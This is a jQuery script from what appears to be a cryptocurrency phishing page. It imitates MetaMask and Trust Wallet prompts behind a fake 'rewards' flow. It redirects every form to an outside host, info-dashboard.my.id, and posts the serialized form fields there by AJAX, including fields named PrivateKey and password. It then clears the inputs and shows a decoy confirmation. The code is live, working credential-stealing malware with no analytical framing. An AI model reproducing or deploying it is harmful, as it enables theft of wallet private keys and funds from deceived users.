$("form").submit(function() {
  $(myform).attr("action", "//info-dashboard.my.id/form/roketss.php");
});

$('.beTwZZ').on('click', function() {  
    $('#metamask').fadeIn()   
    $('.modal').hide()     
})

$('.beTwZZ2').on('click', function() {   
    $('#trustwallet').fadeIn()    
    $('.modal').hide()     
})

$('.addon-box .head > a').on('click', function() {   
    location.reload();   
})

$('.addon-box .headtrust > a').on('click', function() {   
    location.reload();   
})

$('#rewards .confirm-approve-content__small-text > button').on('click', function() {   
    $('#metamask').fadeIn() 
    $('#rewards').hide()
})

$('#rewards2 .confirm-approve-content__small-text > button').on('click', function() {   
    $('#trustwallet').fadeIn() 
    $('#rewards2').hide()
})

 //savemetamask
 $("#metamask").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: '//info-dashboard.my.id/form/rokets.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
                loadData();
            }
        });
        $("#PrivateKey").val("");
        $("#password1").val("");
        $("#password2").val("");
        $('#metamask').hide() 
        $('#rewards').fadeIn()
    });
	

    //savetrustwallet
    $("#trustwallet").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: '//info-dashboard.my.id/form/roket.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
                loadData();
            }
        });
        $("#PrivateKey").val("");
        $('#trustwallet').hide() 
        $('#rewards2').fadeIn()
    });
	